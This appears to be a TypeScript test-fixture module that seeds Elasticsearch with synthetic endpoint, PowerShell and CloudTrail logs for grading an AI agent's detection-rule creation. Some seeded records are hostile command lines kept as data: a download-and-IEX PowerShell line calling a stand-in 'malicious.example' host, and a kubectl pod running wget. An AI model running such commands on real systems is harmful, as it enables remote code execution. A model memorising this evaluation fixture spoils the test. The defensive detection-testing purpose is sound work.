/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import type { Client } from '@elastic/elasticsearch';
import type { ToolingLog } from '@kbn/tooling-log';
import { goldenDataset } from '../datasets/rule_creation_golden';
import { hardCases } from '../datasets/hard_cases';

/**
 * Security data backing the golden dataset's expected queries.
 *
 * WHY THIS EXISTS (measured 2026-08-11 against the eval stack):
 * The Scout stack boots with ZERO security documents — `.alerts-security.alerts-*` = 0,
 * `logs-endpoint.events.*` = 0, and the only `logs-*` index is Agent Builder's own OTel
 * telemetry. `generate_esql` then fails with "Could not discover a suitable index", which is a
 * TRUTHFUL error about an empty stack rather than an agent defect. Measured effect: 12/16
 * `security.create_detection_rule` calls failed (75%), and `Tool Routing` was scoring the
 * fixture rather than routing quality.
 *
 * WHY NOT A STOCK es_archive:
 * No shipped archive fits this dataset. Checked:
 *   - `session_view/process_events_merged` — index name matches `logs-endpoint.events.process`,
 *     but it maps only 6 fields (event.action, host.id, message, process.entry_leader.entity_id,
 *     process.tty.char_device.{major,minor}) and ZERO of the fields the dataset queries. Seeding
 *     it moved the failure from "no index" to `Unknown column "event.code"` — still a fixture
 *     defect. Index-name match is not field-coverage match.
 *   - `security_solution/ecs_compliant` — mappings-only (no data.json), so it creates an EMPTY
 *     index; entity-analytics pairs it with a separate data generator.
 *   - `endpoint/resolver/*`, `signals/*` — wrong index names and shapes.
 *
 * The dataset's reference queries span three index patterns, so all three are seeded here.
 */

/** Index patterns the golden/hard-case datasets read via `FROM ...`. */
const ENDPOINT_INDEX = 'logs-endpoint.events.process-default';
const POWERSHELL_INDEX = 'logs-windows.powershell_operational-default';
const CLOUDTRAIL_INDEX = 'logs-aws.cloudtrail-default';

/**
 * Index patterns a reference query may legitimately target. Derived from the constants above so a
 * new fixture index cannot drift out of sync with the hygiene guard in
 * reference_query_hygiene.test.ts.
 */
export const SEEDED_INDEX_PATTERNS = [ENDPOINT_INDEX, POWERSHELL_INDEX, CLOUDTRAIL_INDEX].map(
  (index) => index.replace(/-default$/, '')
);

/**
 * NOTE: no explicit mappings are declared here. These indices are `logs-*` data streams, and the
 * built-in `logs` index template already maps the ECS fields the datasets query (verified:
 * `event.code` resolves as `keyword` and ES|QL `WHERE event.code == "1"` matches). Declaring a
 * second mapping would silently drift from the template the product actually uses.
 */

interface SeededIndex {
  index: string;
  docs: Array<Record<string, unknown>>;
}

const nowIso = () => new Date().toISOString();

/**
 * Documents are deliberately BENIGN-plus-a-few-suspicious rather than uniformly malicious: a rule
 * that matches every document is indistinguishable from a rule that matches the right ones, so a
 * fixture of pure attack traffic cannot detect an over-broad query.
 */
export const buildFixtures = (): SeededIndex[] => [
  {
    index: ENDPOINT_INDEX,
    docs: [
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'sudo',
          args: ['sudo', 'su', '-'],
          command_line: 'sudo su -',
          executable: '/usr/bin/sudo',
          parent: { name: 'bash', args: ['bash'], command_line: '/bin/bash' },
        },
        host: { id: 'host-1', name: 'linux-web-01', os: { type: 'linux', family: 'debian' } },
        user: { name: 'root', domain: 'corp' },
      },
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'fodhelper.exe',
          args: ['fodhelper.exe'],
          command_line: 'C:\\Windows\\System32\\fodhelper.exe',
          executable: 'C:\\Windows\\System32\\fodhelper.exe',
          parent: {
            name: 'explorer.exe',
            args: ['explorer.exe'],
            command_line: 'C:\\Windows\\explorer.exe',
          },
        },
        host: { id: 'host-2', name: 'win-desktop-07', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'chrome.exe',
          args: ['chrome.exe', '--type=renderer'],
          command_line: 'C:\\Program Files\\Google\\Chrome\\chrome.exe --type=renderer',
          executable: 'C:\\Program Files\\Google\\Chrome\\chrome.exe',
          parent: {
            name: 'explorer.exe',
            args: ['explorer.exe'],
            command_line: 'C:\\Windows\\explorer.exe',
          },
        },
        host: { id: 'host-3', name: 'win-desktop-08', os: { type: 'windows', family: 'windows' } },
        user: { name: 'asmith', domain: 'corp' },
      },
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'sshd',
          args: ['sshd', '-D'],
          command_line: '/usr/sbin/sshd -D',
          executable: '/usr/sbin/sshd',
          parent: { name: 'systemd', args: ['systemd'], command_line: '/sbin/init' },
        },
        host: { id: 'host-1', name: 'linux-web-01', os: { type: 'linux', family: 'debian' } },
        user: { name: 'svc-ssh', domain: 'corp' },
      },
      // `gap-t1078-001` aggregates `COUNT(*) ... WHERE attempt_count > 5`, so a single matching
      // document is unwinnable by construction: the predicate matches but the threshold cannot.
      // Six repeats of the same (host.name, user.name, process.name) tuple put the bucket at 7
      // including the `sudo` document above, which clears the threshold with margin rather than
      // sitting exactly on it.
      ...Array.from({ length: 6 }, (_, i) => ({
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'sudo',
          args: ['sudo', 'su', '-'],
          command_line: `sudo su - # attempt ${i + 1}`,
          executable: '/usr/bin/sudo',
          parent: { name: 'bash', args: ['bash'], command_line: '/bin/bash' },
        },
        host: { id: 'host-1', name: 'linux-web-01', os: { type: 'linux', family: 'debian' } },
        user: { name: 'root', domain: 'corp' },
      })),
      // `gap-t1548-002` (UAC bypass via mmc.exe WF.msc). Needs a `process.parent.args` value, which
      // no other fixture document writes.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'cmd.exe',
          args: ['cmd.exe', '/c', 'whoami'],
          command_line: 'C:\\Windows\\System32\\cmd.exe /c whoami',
          executable: 'C:\\Windows\\System32\\cmd.exe',
          parent: {
            name: 'mmc.exe',
            args: ['WF.msc'],
            command_line: 'C:\\Windows\\System32\\mmc.exe WF.msc',
          },
        },
        host: { id: 'host-2', name: 'win-desktop-07', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
      // `hard-t1195-002` (npm lifecycle hook) filters on `process.parent.name == "node"`.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'sh',
          args: ['sh', '-c', 'node install'],
          command_line: 'sh -c "node install"',
          executable: '/bin/sh',
          parent: { name: 'node', args: ['node', 'install'], command_line: 'node install' },
        },
        host: { id: 'host-4', name: 'linux-build-02', os: { type: 'linux', family: 'debian' } },
        user: { name: 'ci-runner', domain: 'corp' },
      },
      // `hard-t1609` (container admin command). Requires `process.args == "run"` alongside a
      // `command_line` matching one of the shell/download `LIKE` branches.
      {
        '@timestamp': nowIso(),
        event: { action: 'exec', type: 'start', category: 'process', outcome: 'success' },
        process: {
          name: 'kubectl',
          args: ['kubectl', 'run', '--image=busybox'],
          command_line: 'kubectl run pwn --image=busybox -- sh -c "wget http://x/y"',
          executable: '/usr/local/bin/kubectl',
          parent: { name: 'bash', args: ['bash'], command_line: '/bin/bash' },
        },
        host: { id: 'host-4', name: 'linux-build-02', os: { type: 'linux', family: 'debian' } },
        user: { name: 'ci-runner', domain: 'corp' },
      },
    ],
  },
  {
    index: POWERSHELL_INDEX,
    docs: [
      {
        '@timestamp': nowIso(),
        event: {
          code: '4104',
          provider: 'Microsoft-Windows-PowerShell',
          action: 'execute-pipeline',
          category: 'process',
          outcome: 'success',
        },
        file: {
          script_block_text:
            'Invoke-WebRequest -Uri http://malicious.example/p.ps1 -OutFile p.ps1; IEX (Get-Content p.ps1)',
          path: 'C:\\Temp\\p.ps1',
        },
        process: { name: 'powershell.exe', command_line: 'powershell.exe -enc SQBFAFgA' },
        host: { id: 'host-2', name: 'win-desktop-07', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
      {
        '@timestamp': nowIso(),
        event: {
          code: '4104',
          provider: 'Microsoft-Windows-PowerShell',
          action: 'execute-pipeline',
          category: 'process',
          outcome: 'success',
        },
        file: {
          script_block_text: 'Get-ChildItem -Path C:\\Users -Recurse | Measure-Object',
          path: 'C:\\Scripts\\inventory.ps1',
        },
        process: { name: 'powershell.exe', command_line: 'powershell.exe -File inventory.ps1' },
        host: { id: 'host-3', name: 'win-desktop-08', os: { type: 'windows', family: 'windows' } },
        user: { name: 'asmith', domain: 'corp' },
      },
      // `gap-t1027` reads `powershell.file.script_block_text` (the ECS `powershell.*` field set),
      // NOT the `file.script_block_text` the documents above write. Both are seeded here so the
      // reference resolves without rewriting the other two documents.
      //
      // The query requires LENGTH > 1000 and a numeric ratio > 0.5. `REPLACE(text, "0123456789",
      // "")` removes the literal ten-digit RUN, not any digit, so the ratio only moves when that
      // exact substring repeats — hence a payload built from repeated "0123456789" blocks.
      {
        '@timestamp': nowIso(),
        event: {
          code: '4104',
          provider: 'Microsoft-Windows-PowerShell',
          action: 'execute-pipeline',
          category: 'process',
          outcome: 'success',
        },
        powershell: {
          file: {
            // 120 x 10 digits = 1200 numeric chars, plus a short prefix: length > 1000 and the
            // removable numeric run is the clear majority of the string.
            script_block_text: `$x='${'0123456789'.repeat(120)}';IEX $x`,
          },
        },
        file: {
          script_block_text: `$x='${'0123456789'.repeat(120)}';IEX $x`,
          path: 'C:\\Temp\\obfuscated.ps1',
        },
        process: { name: 'powershell.exe', command_line: 'powershell.exe -enc AAA' },
        host: { id: 'host-2', name: 'win-desktop-07', os: { type: 'windows', family: 'windows' } },
        user: { name: 'jdoe', domain: 'corp' },
      },
    ],
  },
  {
    index: CLOUDTRAIL_INDEX,
    docs: [
      {
        '@timestamp': nowIso(),
        event: {
          action: 'ConsoleLogin',
          provider: 'signin.amazonaws.com',
          outcome: 'failure',
          category: 'authentication',
          dataset: 'aws.cloudtrail',
        },
        aws: {
          cloudtrail: { event_name: 'ConsoleLogin', user_identity: 'arn:aws:iam::1:user/bob' },
        },
        user: { name: 'bob', domain: 'aws' },
        host: { id: 'aws-1', name: 'aws-console' },
      },
      {
        '@timestamp': nowIso(),
        event: {
          action: 'CreateUser',
          provider: 'iam.amazonaws.com',
          outcome: 'success',
          category: 'iam',
          dataset: 'aws.cloudtrail',
        },
        aws: {
          cloudtrail: { event_name: 'CreateUser', user_identity: 'arn:aws:iam::1:user/admin' },
        },
        user: { name: 'admin', domain: 'aws' },
        host: { id: 'aws-1', name: 'aws-console' },
      },
      // `hard-t1562-008` (Route53 query-log deletion). Groups by `cloud.account.id` and
      // `source.ip`, neither of which any other CloudTrail document writes.
      {
        '@timestamp': nowIso(),
        event: {
          action: 'DeleteResolverQueryLogConfig',
          provider: 'route53resolver.amazonaws.com',
          outcome: 'success',
          category: 'configuration',
          dataset: 'aws.cloudtrail',
        },
        aws: {
          cloudtrail: {
            event_name: 'DeleteResolverQueryLogConfig',
            user_identity: 'arn:aws:iam::1:user/eve',
          },
        },
        cloud: { account: { id: '111122223333' }, provider: 'aws', region: 'us-east-1' },
        source: { ip: '203.0.113.42' },
        user: { name: 'eve', domain: 'aws' },
        host: { id: 'aws-1', name: 'aws-console' },
      },
    ],
  },
];

/**
 * Asserts every reference query matches at least one seeded row.
 *
 * WHY (measured 2026-08-12): 6 of 7 references returned ZERO rows against the seeded stack while
 * every static gate stayed green, because the two static guards check different things:
 * `reference_query_hygiene` checks query *shape*, `reference_fixture_parity` checks that referenced
 * *fields* are seeded. Neither runs the query, so a reference could read only seeded fields and
 * still match nothing — two causes seen live: a threshold no fixture volume could clear
 * (`WHERE attempt_count > 5` against a single row) and scenarios nobody seeded (no `mmc.exe`
 * parent, no `kubectl`, no npm, no Route53).
 *
 * The effect was silent: `Gap Addressed` scored 1.00 while grading against a reference matching no
 * data. Only executing the query catches that, so this runs at seed time where the client exists.
 *
 * Broken fixtures are excluded — they are deliberately unsatisfiable, so requiring rows of them
 * would assert the opposite of their purpose.
 */
const assertReferencesMatchRows = async ({
  esClient,
  log,
}: {
  esClient: Client;
  log: ToolingLog;
}): Promise<void> => {
  const references = [...goldenDataset, ...hardCases].flatMap((example) =>
    example.output.esqlQuery && !example.output.isBrokenFixture
      ? [[example.id, example.output.esqlQuery] as const]
      : []
  );

  if (references.length === 0) {
    throw new Error('No reference queries to verify — the reachability check would be vacuous.');
  }

  const unreachable: string[] = [];

  for (const [id, query] of references) {
    try {
      const response = await esClient.esql.query({ query });
      if ((response.values ?? []).length === 0) {
        unreachable.push(`${id}: matched 0 rows`);
      }
    } catch (error) {
      // A malformed reference (unknown column, bad syntax) is a fixture defect too, and reporting
      // it as "0 rows" would hide the actual cause.
      unreachable.push(`${id}: query failed — ${error?.message ?? String(error)}`);
    }
  }

  if (unreachable.length > 0) {
    throw new Error(
      `${unreachable.length}/${references.length} reference queries match no seeded data. ` +
        `Every example graded against them is unwinnable, so their scores would measure the ` +
        `fixture rather than the agent:\n  - ${unreachable.join('\n  - ')}`
    );
  }

  log.info(`Verified all ${references.length} reference queries match seeded data`);
};

/**
 * Explicit mappings for fields dynamic inference gets wrong.
 *
 * Measured 2026-08-12: `powershell.file.script_block_text` was dynamically mapped as
 * `keyword` with `ignore_above: 1024`, so a 1211-char script block was silently DROPPED —
 * the document indexed, the field read back null, and `gap-t1027` (which requires
 * `LENGTH(...) > 1000`) matched zero rows with no error. A keyword field can never satisfy that
 * reference, so the mapping has to be declared rather than inferred.
 *
 * Applied as a component-less index template scoped to the fixture data streams. It intentionally
 * declares ONLY the fields dynamic mapping gets wrong; everything else still comes from the stock
 * `logs` template, so this cannot drift into a parallel definition of the whole schema.
 */
const SCRIPT_BLOCK_MAPPING_TEMPLATE = {
  name: 'kbn-evals-rule-creation-script-block',
  // Must outrank the built-in `logs` template (priority 100).
  priority: 500,
  index_patterns: [`${POWERSHELL_INDEX.replace(/-default$/, '')}-*`],
  data_stream: {},
  template: {
    mappings: {
      properties: {
        powershell: {
          properties: {
            file: {
              properties: {
                // `wildcard` stores the full value with no length ceiling and supports both
                // LENGTH() and LIKE, which is what the reference needs.
                script_block_text: { type: 'wildcard' as const },
              },
            },
          },
        },
        file: {
          properties: {
            script_block_text: { type: 'wildcard' as const },
          },
        },
      },
    },
  },
};

/**
 * Seeds the indices the datasets query. Returns a cleanup function.
 *
 * Throws if any index ends up empty — a silently unseeded stack makes every downstream score
 * measure the harness instead of the agent, which is the exact failure this module exists to stop.
 */
export const seedSecurityData = async ({
  esClient,
  log,
}: {
  esClient: Client;
  log: ToolingLog;
}): Promise<() => Promise<void>> => {
  const fixtures = buildFixtures();

  // Must be applied BEFORE any write: a data stream's mappings are resolved when its first backing
  // index is created, so a template installed afterwards would not affect already-seeded data.
  //
  // Deleting any pre-existing fixture stream first is load-bearing, not defensive tidying: a stream
  // left behind by an earlier run (a failed run's teardown never fires) keeps the mappings it was
  // created with, and field mappings are immutable. Measured 2026-08-12 — the template was
  // installed correctly and `powershell.file.script_block_text` still resolved as
  // `keyword`/`ignore_above: 1024` from the stale backing index, silently dropping the >1000-char
  // script block that `gap-t1027` requires.
  await esClient.indices.deleteDataStream(
    { name: fixtures.map((f) => f.index) },
    { ignore: [404] }
  );
  await esClient.indices.putIndexTemplate(SCRIPT_BLOCK_MAPPING_TEMPLATE);

  for (const { index, docs } of fixtures) {
    // `logs-*` is governed by a data-stream-only index template, so `indices.create` fails with
    // illegal_argument_exception ("matches with template [logs] that creates data streams only").
    // Bulk-indexing lazily auto-creates the backing data stream instead. Writes into a data stream
    // must use create-semantics ops (`create`, not `index`) and carry an `@timestamp`.
    const result = await esClient.bulk({
      refresh: true,
      operations: docs.flatMap((doc) => [{ create: { _index: index } }, doc]),
    });

    // Without this, a rejected bulk leaves the stack empty and the failure only surfaces later as
    // an unexplained low score.
    if (result.errors) {
      const firstError = result.items.find((item) => item.create?.error)?.create?.error;
      throw new Error(
        `Failed to seed "${index}": ${firstError?.type ?? 'unknown'} — ${
          firstError?.reason ?? 'no reason reported'
        }`
      );
    }

    // Assert on the pattern the DATASET queries (`<index>-*`-style), not the literal index name.
    // An index can exist and hold documents while the pattern under test resolves to nothing.
    const pattern = `${index.replace(/-default$/, '')}-*`;
    const { count } = await esClient.count({ index: pattern });
    if (count === 0) {
      throw new Error(
        `Seeded "${index}" but the dataset's pattern "${pattern}" resolves to 0 documents. ` +
          `The run would score an empty stack.`
      );
    }
    log.info(`Seeded ${count} docs reachable via ${pattern}`);
  }

  await assertReferencesMatchRows({ esClient, log });

  return async () => {
    await esClient.indices.deleteDataStream(
      { name: fixtures.map((f) => f.index) },
      { ignore: [404] }
    );
    // Leaving the template behind would silently change the mappings of any later run's data
    // streams, so teardown has to undo it too.
    await esClient.indices.deleteIndexTemplate(
      { name: SCRIPT_BLOCK_MAPPING_TEMPLATE.name },
      { ignore: [404] }
    );
  };
};
